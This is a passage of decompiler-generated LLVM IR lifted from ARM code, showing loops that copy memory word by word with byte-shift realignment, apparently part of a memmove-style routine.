  store i32 %v3_120a8, i32* %r3.global-to-local, align 4
  %v1_120ac = inttoptr i32 %v0_120ac to i32*
  %v2_120ac = load i32, i32* %v1_120ac, align 4
  store i32 %v2_120ac, i32* %r4.global-to-local, align 4
  %v3_120ac = add i32 %v0_120ac, 4
  %v4_120ac = inttoptr i32 %v3_120ac to i32*
  %v5_120ac = load i32, i32* %v4_120ac, align 4
  store i32 %v5_120ac, i32* %r5.global-to-local, align 4
  %v6_120ac = add i32 %v0_120ac, 8
  %v7_120ac = inttoptr i32 %v6_120ac to i32*
  %v8_120ac = load i32, i32* %v7_120ac, align 4
  store i32 %v8_120ac, i32* %ip.global-to-local, align 4
  %v9_120ac = add i32 %v0_120ac, 12
  %v10_120ac = inttoptr i32 %v9_120ac to i32*
  %v11_120ac = load i32, i32* %v10_120ac, align 4
  store i32 %v11_120ac, i32* @lr, align 4
  %v12_120ac = add i32 %v0_120ac, 16
  store i32 %v12_120ac, i32* %r1.global-to-local, align 4
  %v4_120b0 = mul i32 %v2_120ac, 16777216
  %v5_120b0 = or i32 %v4_120b0, %v3_120a8
  store i32 %v5_120b0, i32* %r3.global-to-local, align 4
  %v3_120b4 = udiv i32 %v2_120ac, 256
  %v4_120b8 = mul i32 %v5_120ac, 16777216
  %v5_120b8 = or i32 %v4_120b8, %v3_120b4
  store i32 %v5_120b8, i32* %r4.global-to-local, align 4
  %v3_120bc = udiv i32 %v5_120ac, 256
  %v4_120c0 = mul i32 %v8_120ac, 16777216
  %v5_120c0 = or i32 %v4_120c0, %v3_120bc
  store i32 %v5_120c0, i32* %r5.global-to-local, align 4
  %v3_120c4 = udiv i32 %v8_120ac, 256
  %v4_120c8 = mul i32 %v11_120ac, 16777216
  %v5_120c8 = or i32 %v4_120c8, %v3_120c4
  store i32 %v5_120c8, i32* @ip, align 4
  %v1_120cc = inttoptr i32 %v0_120cc to i32*
  store i32 %v5_120b0, i32* %v1_120cc, align 4
  %v3_120cc = add i32 %v0_120cc, 4
  %v4_120cc = inttoptr i32 %v3_120cc to i32*
  %v5_120cc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_120cc, i32* %v4_120cc, align 4
  %v6_120cc = add i32 %v0_120cc, 8
  %v7_120cc = inttoptr i32 %v6_120cc to i32*
  %v8_120cc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_120cc, i32* %v7_120cc, align 4
  %v9_120cc = add i32 %v0_120cc, 12
  %v10_120cc = inttoptr i32 %v9_120cc to i32*
  %v11_120cc = load i32, i32* @ip, align 4
  store i32 %v11_120cc, i32* %v10_120cc, align 4
  %v12_120cc = add i32 %v0_120cc, 16
  store i32 %v12_120cc, i32* %r0.global-to-local, align 4
  %v0_120d0 = load i32, i32* %r2.global-to-local, align 4
  %v2_120d0 = add i32 %v0_120d0, -16
  store i32 %v2_120d0, i32* %r2.global-to-local, align 4
  %v6_120d4 = icmp slt i32 %v0_120d0, 16
  br i1 %v6_120d4, label %dec_label_pc_120d8, label %dec_label_pc_120a8.dec_label_pc_120a8_crit_edge

dec_label_pc_120a8.dec_label_pc_120a8_crit_edge:  ; preds = %dec_label_pc_120a8
  %v0_120a8.pre = load i32, i32* @lr, align 4
  %v0_120ac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_120a8

dec_label_pc_120d8:                               ; preds = %dec_label_pc_120a8
  %v2_120d8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_120d8, i32* @r4, align 4
  %v5_120d8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_120d8, i32* @r5, align 4
  %v2_120dc = add i32 %v0_120d0, -4
  store i32 %v2_120dc, i32* %r2.global-to-local, align 4
  %v4_120dc = add i32 %v0_120d0, 2147483632
  %v5_120dc = and i32 %v2_120dc, %v4_120dc
  %v6_120dc = icmp slt i32 %v5_120dc, 0
  store i1 %v6_120dc, i1* %cpsr_v.global-to-local, align 1
  %v7_120dc = icmp slt i32 %v2_120dc, 0
  store i1 %v7_120dc, i1* %cpsr_n.global-to-local, align 1
  %v5_120e0 = icmp slt i32 %v2_120d0, -12
  br i1 %v5_120e0, label %dec_label_pc_120fc, label %dec_label_pc_120e4

dec_label_pc_120e4:                               ; preds = %dec_label_pc_120d8, %dec_label_pc_12098, %dec_label_pc_120e4
  %v1_120f0 = phi i32 [ %v4_120f0, %dec_label_pc_120e4 ], [ %v12_120cc, %dec_label_pc_120d8 ], [ %v0_120cc75, %dec_label_pc_12098 ]
  %v0_120e4 = load i32, i32* @lr, align 4
  %v3_120e4 = udiv i32 %v0_120e4, 256
  store i32 %v3_120e4, i32* %ip.global-to-local, align 4
  %v0_120e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_120e8 = inttoptr i32 %v0_120e8 to i32*
  %v2_120e8 = load i32, i32* %v1_120e8, align 4
  store i32 %v2_120e8, i32* @lr, align 4
  %v4_120e8 = add i32 %v0_120e8, 4
  store i32 %v4_120e8, i32* %r1.global-to-local, align 4
  %v4_120ec = mul i32 %v2_120e8, 16777216
  %v5_120ec = or i32 %v4_120ec, %v3_120e4
  store i32 %v5_120ec, i32* @ip, align 4
  %v2_120f0 = inttoptr i32 %v1_120f0 to i32*
  store i32 %v5_120ec, i32* %v2_120f0, align 4
  %v3_120f0 = load i32, i32* %r0.global-to-local, align 4
  %v4_120f0 = add i32 %v3_120f0, 4
  store i32 %v4_120f0, i32* %r0.global-to-local, align 4
  %v0_120f4 = load i32, i32* %r2.global-to-local, align 4
  %v2_120f4 = add i32 %v0_120f4, -4
  store i32 %v2_120f4, i32* %r2.global-to-local, align 4
  %v6_120f8 = icmp slt i32 %v0_120f4, 4
  br i1 %v6_120f8, label %dec_label_pc_120fc.loopexit, label %dec_label_pc_120e4

dec_label_pc_120fc.loopexit:                      ; preds = %dec_label_pc_120e4
  %v4_120f4 = sub i32 3, %v0_120f4
  %v5_120f4 = and i32 %v4_120f4, %v0_120f4
  %v6_120f4 = icmp slt i32 %v5_120f4, 0
  %v7_120f4 = icmp slt i32 %v2_120f4, 0
  store i1 %v6_120f4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_120f4, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_120fc

dec_label_pc_120fc:                               ; preds = %dec_label_pc_120fc.loopexit, %dec_label_pc_120d8
  %v2_1203c113 = phi i32 [ %v4_120f0, %dec_label_pc_120fc.loopexit ], [ %v12_120cc, %dec_label_pc_120d8 ]
  %v0_1202c109 = phi i32 [ %v2_120f4, %dec_label_pc_120fc.loopexit ], [ %v2_120dc, %dec_label_pc_120d8 ]
  %v0_120fc = load i32, i32* %r1.global-to-local, align 4
  %v1_120fc = add i32 %v0_120fc, -3
  store i32 %v1_120fc, i32* @r1, align 4
  br label %bb133

dec_label_pc_12104:                               ; preds = %dec_label_pc_12084
  br i1 %v5_12174, label %dec_label_pc_12150, label %dec_label_pc_1210c

dec_label_pc_1210c:                               ; preds = %dec_label_pc_12104
  store i32 %v2_12170, i32* %r2.global-to-local, align 4
  %v3_12110 = load i32, i32* @r4, align 4
  store i32 %v3_12110, i32* %stack_var_-16, align 4
  %v6_12110 = load i32, i32* @r5, align 4
  store i32 %v6_12110, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12114

dec_label_pc_12114:                               ; preds = %dec_label_pc_12114.dec_label_pc_12114_crit_edge, %dec_label_pc_1210c
  %v0_12138 = phi i32 [ %v12_12138, %dec_label_pc_12114.dec_label_pc_12114_crit_edge ], [ %v0_120cc75, %dec_label_pc_1210c ]
  %v0_12118 = phi i32 [ %v0_12118.pre, %dec_label_pc_12114.dec_label_pc_12114_crit_edge ], [ %v4_12088, %dec_label_pc_1210c ]
  %v0_12114 = phi i32 [ %v0_12114.pre, %dec_label_pc_12114.dec_label_pc_12114_crit_edge ], [ %v2_12088, %dec_label_pc_1210c ]
  %v3_12114 = udiv i32 %v0_12114, 65536
  store i32 %v3_12114, i32* %r3.global-to-local, align 4
  %v1_12118 = inttoptr i32 %v0_12118 to i32*
  %v2_12118 = load i32, i32* %v1_12118, align 4
  store i32 %v2_12118, i32* %r4.global-to-local, align 4
  %v3_12118 = add i32 %v0_12118, 4
  %v4_12118 = inttoptr i32 %v3_12118 to i32*
  %v5_12118 = load i32, i32* %v4_12118, align 4
  store i32 %v5_12118, i32* %r5.global-to-local, align 4
  %v6_12118 = add i32 %v0_12118, 8
  %v7_12118 = inttoptr i32 %v6_12118 to i32*
  %v8_12118 = load i32, i32* %v7_12118, align 4
  store i32 %v8_12118, i32* %ip.global-to-local, align 4
  %v9_12118 = add i32 %v0_12118, 12
  %v10_12118 = inttoptr i32 %v9_12118 to i32*
  %v11_12118 = load i32, i32* %v10_12118, align 4
  store i32 %v11_12118, i32* @lr, align 4
  %v12_12118 = add i32 %v0_12118, 16
  store i32 %v12_12118, i32* %r1.global-to-local, align 4
  %v4_1211c = mul i32 %v2_12118, 65536
  %v5_1211c = or i32 %v4_1211c, %v3_12114
  store i32 %v5_1211c, i32* %r3.global-to-local, align 4
  %v3_12120 = udiv i32 %v2_12118, 65536
  %v4_12124 = mul i32 %v5_12118, 65536
  %v5_12124 = or i32 %v4_12124, %v3_12120
  store i32 %v5_12124, i32* %r4.global-to-local, align 4
  %v3_12128 = udiv i32 %v5_12118, 65536
  %v4_1212c = mul i32 %v8_12118, 65536
  %v5_1212c = or i32 %v4_1212c, %v3_12128
  store i32 %v5_1212c, i32* %r5.global-to-local, align 4
  %v3_12130 = udiv i32 %v8_12118, 65536
  %v4_12134 = mul i32 %v11_12118, 65536
  %v5_12134 = or i32 %v4_12134, %v3_12130
  store i32 %v5_12134, i32* @ip, align 4
  %v1_12138 = inttoptr i32 %v0_12138 to i32*
  store i32 %v5_1211c, i32* %v1_12138, align 4
  %v3_12138 = add i32 %v0_12138, 4
  %v4_12138 = inttoptr i32 %v3_12138 to i32*
  %v5_12138 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_12138, i32* %v4_12138, align 4
  %v6_12138 = add i32 %v0_12138, 8
  %v7_12138 = inttoptr i32 %v6_12138 to i32*
  %v8_12138 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_12138, i32* %v7_12138, align 4
  %v9_12138 = add i32 %v0_12138, 12
  %v10_12138 = inttoptr i32 %v9_12138 to i32*
  %v11_12138 = load i32, i32* @ip, align 4
  store i32 %v11_12138, i32* %v10_12138, align 4
  %v12_12138 = add i32 %v0_12138, 16
  store i32 %v12_12138, i32* %r0.global-to-local, align 4
  %v0_1213c = load i32, i32* %r2.global-to-local, align 4
  %v2_1213c = add i32 %v0_1213c, -16
  store i32 %v2_1213c, i32* %r2.global-to-local, align 4
  %v6_12140 = icmp slt i32 %v0_1213c, 16
  br i1 %v6_12140, label %dec_label_pc_12144, label %dec_label_pc_12114.dec_label_pc_12114_crit_edge

dec_label_pc_12114.dec_label_pc_12114_crit_edge:  ; preds = %dec_label_pc_12114
  %v0_12114.pre = load i32, i32* @lr, align 4
  %v0_12118.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12114

dec_label_pc_12144:                               ; preds = %dec_label_pc_12114
  %v2_12144 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12144, i32* @r4, align 4
  %v5_12144 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_12144, i32* @r5, align 4
  %v2_12148 = add i32 %v0_1213c, -4
  store i32 %v2_12148, i32* %r2.global-to-local, align 4
  %v4_12148 = add i32 %v0_1213c, 2147483632
  %v5_12148 = and i32 %v2_12148, %v4_12148
  %v6_12148 = icmp slt i32 %v5_12148, 0
  store i1 %v6_12148, i1* %cpsr_v.global-to-local, align 1
  %v7_12148 = icmp slt i32 %v2_12148, 0
  store i1 %v7_12148, i1* %cpsr_n.global-to-local, align 1
  %v5_1214c = icmp slt i32 %v2_1213c, -12
  br i1 %v5_1214c, label %dec_label_pc_12168, label %dec_label_pc_12150

dec_label_pc_12150:                               ; preds = %dec_label_pc_12144, %dec_label_pc_12104, %dec_label_pc_12150
  %v1_1215c = phi i32 [ %v4_1215c, %dec_label_pc_12150 ], [ %v12_12138, %dec_label_pc_12144 ], [ %v0_120cc75, %dec_label_pc_12104 ]
  %v0_12150 = load i32, i32* @lr, align 4
  %v3_12150 = udiv i32 %v0_12150, 65536
  store i32 %v3_12150, i32* %ip.global-to-local, align 4
  %v0_12154 = load i32, i32* %r1.global-to-local, align 4
  %v1_12154 = inttoptr i32 %v0_12154 to i32*
  %v2_12154 = load i32, i32* %v1_12154, align 4
  store i32 %v2_12154, i32* @lr, align 4
  %v4_12154 = add i32 %v0_12154, 4
  store i32 %v4_12154, i32* %r1.global-to-local, align 4
  %v4_12158 = mul i32 %v2_12154, 65536
  %v5_12158 = or i32 %v4_12158, %v3_12150
  store i32 %v5_12158, i32* @ip, align 4
  %v2_1215c = inttoptr i32 %v1_1215c to i32*
  store i32 %v5_12158, i32* %v2_1215c, align 4
  %v3_1215c = load i32, i32* %r0.global-to-local, align 4
  %v4_1215c = add i32 %v3_1215c, 4
  store i32 %v4_1215c, i32* %r0.global-to-local, align 4
  %v0_12160 = load i32, i32* %r2.global-to-local, align 4
  %v2_12160 = add i32 %v0_12160, -4
  store i32 %v2_12160, i32* %r2.global-to-local, align 4
  %v6_12164 = icmp slt i32 %v0_12160, 4
  br i1 %v6_12164, label %dec_label_pc_12168.loopexit, label %dec_label_pc_12150

dec_label_pc_12168.loopexit:                      ; preds = %dec_label_pc_12150
  %v4_12160 = sub i32 3, %v0_12160
  %v5_12160 = and i32 %v4_12160, %v0_12160
  %v6_12160 = icmp slt i32 %v5_12160, 0
  %v7_12160 = icmp slt i32 %v2_12160, 0
  store i1 %v6_12160, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_12160, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_12168

dec_label_pc_12168:                               ; preds = %dec_label_pc_12168.loopexit, %dec_label_pc_12144
  %v2_1203c114 = phi i32 [ %v4_1215c, %dec_label_pc_12168.loopexit ], [ %v12_12138, %dec_label_pc_12144 ]
  %v0_1202c110 = phi i32 [ %v2_12160, %dec_label_pc_12168.loopexit ], [ %v2_12148, %dec_label_pc_12144 ]
  %v0_12168 = load i32, i32* %r1.global-to-local, align 4
  %v1_12168 = add i32 %v0_12168, -2
  store i32 %v1_12168, i32* @r1, align 4
  br label %bb133

dec_label_pc_12170:                               ; preds = %dec_label_pc_12084
  br i1 %v5_12174, label %dec_label_pc_121bc, label %dec_label_pc_12178

dec_label_pc_12178:                               ; preds = %dec_label_pc_12170
  store i32 %v2_12170, i32* %r2.global-to-local, align 4
  %v3_1217c = load i32, i32* @r4, align 4
  store i32 %v3_1217c, i32* %stack_var_-16, align 4
  %v6_1217c = load i32, i32* @r5, align 4
  store i32 %v6_1217c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12180

dec_label_pc_12180:                               ; preds = %dec_label_pc_12180.dec_label_pc_12180_crit_edge, %dec_label_pc_12178
  %v0_121a4 = phi i32 [ %v12_121a4, %dec_label_pc_12180.dec_label_pc_12180_crit_edge ], [ %v0_120cc75, %dec_label_pc_12178 ]
  %v0_12184 = phi i32 [ %v0_12184.pre, %dec_label_pc_12180.dec_label_pc_12180_crit_edge ], [ %v4_12088, %dec_label_pc_12178 ]
  %v0_12180 = phi i32 [ %v0_12180.pre, %dec_label_pc_12180.dec_label_pc_12180_crit_edge ], [ %v2_12088, %dec_label_pc_12178 ]
  %v3_12180 = udiv i32 %v0_12180, 16777216
  store i32 %v3_12180, i32* %r3.global-to-local, align 4
  %v1_12184 = inttoptr i32 %v0_12184 to i32*
  %v2_12184 = load i32, i32* %v1_12184, align 4
  store i32 %v2_12184, i32* %r4.global-to-local, align 4
  %v3_12184 = add i32 %v0_12184, 4
  %v4_12184 = inttoptr i32 %v3_12184 to i32*
  %v5_12184 = load i32, i32* %v4_12184, align 4
  store i32 %v5_12184, i32* %r5.global-to-local, align 4
  %v6_12184 = add i32 %v0_12184, 8
  %v7_12184 = inttoptr i32 %v6_12184 to i32*
  %v8_12184 = load i32, i32* %v7_12184, align 4
  store i32 %v8_12184, i32* %ip.global-to-local, align 4
  %v9_12184 = add i32 %v0_12184, 12
  %v10_12184 = inttoptr i32 %v9_12184 to i32*
  %v11_12184 = load i32, i32* %v10_12184, align 4
  store i32 %v11_12184, i32* @lr, align 4
  %v12_12184 = add i32 %v0_12184, 16
  store i32 %v12_12184, i32* %r1.global-to-local, align 4
  %v4_12188 = mul i32 %v2_12184, 256
  %v5_12188 = or i32 %v4_12188, %v3_12180
  store i32 %v5_12188, i32* %r3.global-to-local, align 4
  %v3_1218c = udiv i32 %v2_12184, 16777216
  %v4_12190 = mul i32 %v5_12184, 256
  %v5_12190 = or i32 %v4_12190, %v3_1218c
  store i32 %v5_12190, i32* %r4.global-to-local, align 4
  %v3_12194 = udiv i32 %v5_12184, 16777216
  %v4_12198 = mul i32 %v8_12184, 256
  %v5_12198 = or i32 %v4_12198, %v3_12194
  store i32 %v5_12198, i32* %r5.global-to-local, align 4
  %v3_1219c = udiv i32 %v8_12184, 16777216
  %v4_121a0 = mul i32 %v11_12184, 256
  %v5_121a0 = or i32 %v4_121a0, %v3_1219c
  store i32 %v5_121a0, i32* @ip, align 4
  %v1_121a4 = inttoptr i32 %v0_121a4 to i32*
  store i32 %v5_12188, i32* %v1_121a4, align 4
  %v3_121a4 = add i32 %v0_121a4, 4
  %v4_121a4 = inttoptr i32 %v3_121a4 to i32*
  %v5_121a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_121a4, i32* %v4_121a4, align 4
  %v6_121a4 = add i32 %v0_121a4, 8
  %v7_121a4 = inttoptr i32 %v6_121a4 to i32*
  %v8_121a4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_121a4, i32* %v7_121a4, align 4
  %v9_121a4 = add i32 %v0_121a4, 12
  %v10_121a4 = inttoptr i32 %v9_121a4 to i32*
  %v11_121a4 = load i32, i32* @ip, align 4
  store i32 %v11_121a4, i32* %v10_121a4, align 4
  %v12_121a4 = add i32 %v0_121a4, 16
  store i32 %v12_121a4, i32* %r0.global-to-local, align 4
  %v0_121a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_121a8 = add i32 %v0_121a8, -16
  store i32 %v2_121a8, i32* %r2.global-to-local, align 4
  %v6_121ac = icmp slt i32 %v0_121a8, 16
  br i1 %v6_121ac, label %dec_label_pc_121b0, label %dec_label_pc_12180.dec_label_pc_12180_crit_edge

dec_label_pc_12180.dec_label_pc_12180_crit_edge:  ; preds = %dec_label_pc_12180
  %v0_12180.pre = load i32, i32* @lr, align 4
  %v0_12184.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12180

dec_label_pc_121b0:                               ; preds = %dec_label_pc_12180
  %v2_121b0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_121b0, i32* @r4, align 4
  %v5_121b0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_121b0, i32* @r5, align 4
  %v2_121b4 = add i32 %v0_121a8, -4
  store i32 %v2_121b4, i32* %r2.global-to-local, align 4
  %v4_121b4 = add i32 %v0_121a8, 2147483632
  %v5_121b4 = and i32 %v2_121b4, %v4_121b4
  %v6_121b4 = icmp slt i32 %v5_121b4, 0
  store i1 %v6_121b4, i1* %cpsr_v.global-to-local, align 1
  %v7_121b4 = icmp slt i32 %v2_121b4, 0
  store i1 %v7_121b4, i1* %cpsr_n.global-to-local, align 1
  %v5_121b8 = icmp slt i32 %v2_121a8, -12
  br i1 %v5_121b8, label %dec_label_pc_121d4, label %dec_label_pc_121bc

dec_label_pc_121bc:                               ; preds = %dec_label_pc_12170, %dec_label_pc_121b0, %dec_label_pc_121bc
  %v1_121c8 = phi i32 [ %v4_121c8, %dec_label_pc_121bc ], [ %v0_120cc75, %dec_label_pc_12170 ], [ %v12_121a4, %dec_label_pc_121b0 ]
  %v0_121bc = load i32, i32* @lr, align 4
  %v3_121bc = udiv i32 %v0_121bc, 16777216
  store i32 %v3_121bc, i32* %ip.global-to-local, align 4
  %v0_121c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_121c0 = inttoptr i32 %v0_121c0 to i32*
  %v2_121c0 = load i32, i32* %v1_121c0, align 4
  store i32 %v2_121c0, i32* @lr, align 4
  %v4_121c0 = add i32 %v0_121c0, 4
  store i32 %v4_121c0, i32* %r1.global-to-local, align 4
  %v4_121c4 = mul i32 %v2_121c0, 256
  %v5_121c4 = or i32 %v4_121c4, %v3_121bc
  store i32 %v5_121c4, i32* @ip, align 4
  %v2_121c8 = inttoptr i32 %v1_121c8 to i32*
  store i32 %v5_121c4, i32* %v2_121c8, align 4
  %v3_121c8 = load i32, i32* %r0.global-to-local, align 4
  %v4_121c8 = add i32 %v3_121c8, 4
  store i32 %v4_121c8, i32* %r0.global-to-local, align 4
  %v0_121cc = load i32, i32* %r2.global-to-local, align 4
  %v2_121cc = add i32 %v0_121cc, -4
  store i32 %v2_121cc, i32* %r2.global-to-local, align 4
  %v6_121d0 = icmp slt i32 %v0_121cc, 4
  br i1 %v6_121d0, label %dec_label_pc_121d4.loopexit, label %dec_label_pc_121bc

dec_label_pc_121d4.loopexit:                      ; preds = %dec_label_pc_121bc
  %v4_121cc = sub i32 3, %v0_121cc
  %v5_121cc = and i32 %v4_121cc, %v0_121cc
  %v6_121cc = icmp slt i32 %v5_121cc, 0
  %v7_121cc = icmp slt i32 %v2_121cc, 0
  store i1 %v6_121cc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_121cc, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_121d4

dec_label_pc_121d4:                               ; preds = %dec_label_pc_121d4.loopexit, %dec_label_pc_121b0
  %v2_1203c112 = phi i32 [ %v4_121c8, %dec_label_pc_121d4.loopexit ], [ %v12_121a4, %dec_label_pc_121b0 ]
  %v0_1202c108 = phi i32 [ %v2_121cc, %dec_label_pc_121d4.loopexit ], [ %v2_121b4, %dec_label_pc_121b0 ]
  %v0_121d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_121d4 = add i32 %v0_121d4, -1
  store i32 %v1_121d4, i32* @r1, align 4
  br label %bb133

dec_label_pc_121dc:                               ; preds = %dec_label_pc_11f90
  %v1_121dc = load i32, i32* @r2, align 4
  %v2_121dc = add i32 %v1_121dc, %v0_11f90
  store i32 %v2_121dc, i32* @r1, align 4
  %v2_121e0 = add i32 %v1_121dc, %v1_11f90
  store i32 %v2_121e0, i32* %r0.global-to-local, align 4
  %v2_121e4 = add i32 %v1_121dc, -4
  store i32 %v2_121e4, i32* %r2.global-to-local, align 4
  %v4_121e4 = sub i32 3, %v1_121dc
  %v5_121e4 = and i32 %v4_121e4, %v1_121dc
  %v6_121e4 = icmp slt i32 %v5_121e4, 0
  store i1 %v6_121e4, i1* %cpsr_v.global-to-local, align 1
  %v7_121e4 = icmp slt i32 %v2_121e4, 0
  store i1 %v7_121e4, i1* %cpsr_n.global-to-local, align 1
  %v5_121e8 = icmp slt i32 %v1_121dc, 4
  br i1 %v5_121e8, label %bb143, label %dec_label_pc_121ec

dec_label_pc_121ec:                               ; preds = %dec_label_pc_121dc
  %v1_121ec = urem i32 %v2_121e0, 4
  store i32 %v1_121ec, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_121ec = icmp eq i32 %v1_121ec, 0
  br i1 %v2_121ec, label %dec_label_pc_121f4, label %dec_label_pc_12294

dec_label_pc_121f4:                               ; preds = %dec_label_pc_121ec
  %v1_121f4 = urem i32 %v2_121dc, 4
  store i32 %v1_121f4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_121f4 = icmp eq i32 %v1_121f4, 0
  br i1 %v2_121f4, label %dec_label_pc_121fc, label %dec_label_pc_122c0

dec_label_pc_121fc:                               ; preds = %dec_label_pc_121f4, %dec_label_pc_122b8
  %v0_1221449 = phi i32 [ %v2_121e0, %dec_label_pc_121f4 ], [ %v0_1230832, %dec_label_pc_122b8 ]
  %v0_1221048 = phi i32 [ %v2_121dc, %dec_label_pc_121f4 ], [ %v0_122b8, %dec_label_pc_122b8 ]
  %v0_121fc = phi i32 [ %v2_121e4, %dec_label_pc_121f4 ], [ %v2_122b0, %dec_label_pc_122b8 ]
  %v2_121fc = add i32 %v0_121fc, -8
  store i32 %v2_121fc, i32* %r2.global-to-local, align 4
  %v4_121fc = sub i32 7, %v0_121fc
  %v5_121fc = and i32 %v4_121fc, %v0_121fc
  %v6_121fc = icmp slt i32 %v5_121fc, 0
  store i1 %v6_121fc, i1* %cpsr_v.global-to-local, align 1
  %v7_121fc = icmp slt i32 %v2_121fc, 0
  store i1 %v7_121fc, i1* %cpsr_n.global-to-local, align 1
  %v5_12200 = icmp slt i32 %v0_121fc, 8
  br i1 %v5_12200, label %dec_label_pc_1224c, label %dec_label_pc_12204

dec_label_pc_12204:                               ; preds = %dec_label_pc_121fc
  %v3_12204 = load i32, i32* @r4, align 4
  %v5_12204 = inttoptr i32 %v3_12204 to i8*
  store i8* %v5_12204, i8** %stack_var_-8, align 4
  %v8_12204 = load i32, i32* @lr, align 4
  %v2_12208 = add i32 %v0_121fc, -28
  store i32 %v2_12208, i32* %r2.global-to-local, align 4
  %v4_12208 = sub i32 27, %v0_121fc
  %v5_12208 = and i32 %v4_12208, %v2_121fc
  %v6_12208 = icmp slt i32 %v5_12208, 0
  store i1 %v6_12208, i1* %cpsr_v.global-to-local, align 1
  %v7_12208 = icmp slt i32 %v2_12208, 0
  store i1 %v7_12208, i1* %cpsr_n.global-to-local, align 1
  %v5_1220c = icmp slt i32 %v2_121fc, 20
  br i1 %v5_1220c, label %dec_label_pc_12228, label %dec_label_pc_12210

dec_label_pc_12210:                               ; preds = %dec_label_pc_12204, %dec_label_pc_12210.dec_label_pc_12210_crit_edge
  %v0_12214 = phi i32 [ %v1_1221c, %dec_label_pc_12210.dec_label_pc_12210_crit_edge ], [ %v0_1221449, %dec_label_pc_12204 ]
  %v0_12210 = phi i32 [ %v0_12210.pre, %dec_label_pc_12210.dec_label_pc_12210_crit_edge ], [ %v0_1221048, %dec_label_pc_12204 ]
  %v1_12210 = add i32 %v0_12210, -4
  %v2_12210 = inttoptr i32 %v1_12210 to i32*
  %v3_12210 = load i32, i32* %v2_12210, align 4
  store i32 %v3_12210, i32* %r3.global-to-local, align 4
  %v4_12210 = add i32 %v0_12210, -8
  %v5_12210 = inttoptr i32 %v4_12210 to i32*
  %v6_12210 = load i32, i32* %v5_12210, align 4
  store i32 %v6_12210, i32* %r4.global-to-local, align 4
  %v7_12210 = add i32 %v0_12210, -12
  %v8_12210 = inttoptr i32 %v7_12210 to i32*
  %v9_12210 = load i32, i32* %v8_12210, align 4
  store i32 %v9_12210, i32* %ip.global-to-local, align 4
  %v10_12210 = add i32 %v0_12210, -16
  %v11_12210 = inttoptr i32 %v10_12210 to i32*
  %v12_12210 = load i32, i32* %v11_12210, align 4
  store i32 %v12_12210, i32* %lr.global-to-local, align 4
  store i32 %v10_12210, i32* %r1.global-to-local, align 4
  %v1_12214 = add i32 %v0_12214, -16
  %v2_12214 = inttoptr i32 %v1_12214 to i32*
  store i32 %v3_12210, i32* %v2_12214, align 4
  %v4_12214 = add i32 %v0_12214, -12
  %v5_12214 = inttoptr i32 %v4_12214 to i32*
  %v6_12214 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_12214, i32* %v5_12214, align 4
  %v7_12214 = add i32 %v0_12214, -8
  %v8_12214 = inttoptr i32 %v7_12214 to i32*
  %v9_12214 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_12214, i32* %v8_12214, align 4
  %v10_12214 = add i32 %v0_12214, -4
  %v11_12214 = inttoptr i32 %v10_12214 to i32*
  %v12_12214 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_12214, i32* %v11_12214, align 4
  store i32 %v1_12214, i32* %r0.global-to-local, align 4
  %v0_12218 = load i32, i32* %r1.global-to-local, align 4
  %v1_12218 = add i32 %v0_12218, -4
  %v2_12218 = inttoptr i32 %v1_12218 to i32*
  %v3_12218 = load i32, i32* %v2_12218, align 4
  store i32 %v3_12218, i32* %r3.global-to-local, align 4
  %v4_12218 = add i32 %v0_12218, -8
  %v5_12218 = inttoptr i32 %v4_12218 to i32*
  %v6_12218 = load i32, i32* %v5_12218, align 4
  store i32 %v6_12218, i32* %r4.global-to-local, align 4
  %v7_12218 = add i32 %v0_12218, -12
  %v8_12218 = inttoptr i32 %v7_12218 to i32*
  %v9_12218 = load i32, i32* %v8_12218, align 4
  store i32 %v9_12218, i32* @ip, align 4
  %v10_12218 = add i32 %v0_12218, -16
  %v11_12218 = inttoptr i32 %v10_12218 to i32*
  %v12_12218 = load i32, i32* %v11_12218, align 4
  store i32 %v12_12218, i32* %lr.global-to-local, align 4
  store i32 %v10_12218, i32* @r1, align 4
  %v1_1221c = add i32 %v0_12214, -32
  %v2_1221c = inttoptr i32 %v1_1221c to i32*
  store i32 %v3_12218, i32* %v2_1221c, align 4
  %v4_1221c = add i32 %v0_12214, -28
  %v5_1221c = inttoptr i32 %v4_1221c to i32*
  %v6_1221c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1221c, i32* %v5_1221c, align 4
  %v7_1221c = add i32 %v0_12214, -24
  %v8_1221c = inttoptr i32 %v7_1221c to i32*
  %v9_1221c = load i32, i32* @ip, align 4
  store i32 %v9_1221c, i32* %v8_1221c, align 4
  %v10_1221c = add i32 %v0_12214, -20
  %v11_1221c = inttoptr i32 %v10_1221c to i32*
  %v12_1221c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1221c, i32* %v11_1221c, align 4
  store i32 %v1_1221c, i32* %r0.global-to-local, align 4
